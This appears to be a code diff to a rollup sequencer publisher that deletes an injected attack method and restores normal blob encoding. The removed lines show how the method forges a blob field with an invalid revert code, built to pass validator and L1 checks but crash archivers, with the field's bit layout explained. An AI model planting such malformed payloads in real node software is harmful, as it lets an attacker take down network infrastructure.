@@ -507,8 +507,7 @@ export class SequencerPublisher {
       );
     }
 
-    // ATTACK: Use malformed fields instead of normal encoding
-    const blobs = await Blob.getBlobsPerBlock(this.createMalformedBlobFields(block));
+    const blobs = await Blob.getBlobsPerBlock(block.body.toBlobFields());
     const blobInput = Blob.getPrefixedEthBlobCommitments(blobs);
 
     const args = [
@@ -777,8 +776,7 @@ export class SequencerPublisher {
   ): Promise<boolean> {
     const proposedBlockHeader = block.header.toPropose();
 
-    // ATTACK: Use malformed fields instead of normal encoding
-    const blobs = await Blob.getBlobsPerBlock(this.createMalformedBlobFields(block));
+    const blobs = await Blob.getBlobsPerBlock(block.body.toBlobFields());
     const proposeTxArgs = {
       header: proposedBlockHeader,
       archive: block.archive.root.toBuffer(),
@@ -1124,36 +1122,4 @@ export class SequencerPublisher {
     });
   }
 
-  /**
-   * ATTACK METHOD: Creates malformed blob fields that will crash archivers
-   *
-   * This creates fields with invalid encoding that:
-   * 1. Pass all validator checks (they don't validate field structure)
-   * 2. Pass L1 checks (L1 only validates KZG commitments)
-   * 3. Crash archivers when they try to deserialize
-   */
-  private createMalformedBlobFields(block: L2Block): Fr[] {
-    this.log.warn('🚨 ATTACK: Creating malformed blob fields');
-
-    // Get normal fields from the block
-    const normalFields = block.body.toBlobFields();
-
-    // Create a malicious first field with invalid revert code
-    // Revert code must be 0-4, but we set it to 5 (invalid!)
-    //
-    // Structure: TX_START_PREFIX | pad | length | pad | REVERT_PREFIX | pad | revert_code
-    // In hex:    74785f7374617274   00    0001     00    01              00    05 (INVALID!)
-    const TX_START = 0x74785f7374617274n; // "tx_start" in hex
-    const length = 1n; // Short length so it parses quickly
-    const REVERT_PREFIX = 0x01n;
-    const INVALID_REVERT_CODE = 0x05n; // Must be 0-4, so 5 is invalid!
-
-    // Construct the malicious field
-    const maliciousFirstField = new Fr(
-      (TX_START << 56n) | (length << 40n) | (REVERT_PREFIX << 16n) | (INVALID_REVERT_CODE << 0n),
-    );
-
-    this.log.warn(`🚨 Malicious first field: ${maliciousFirstField.toString()}`);
-    return [maliciousFirstField, ...normalFields.slice(1)];
-  }
 }
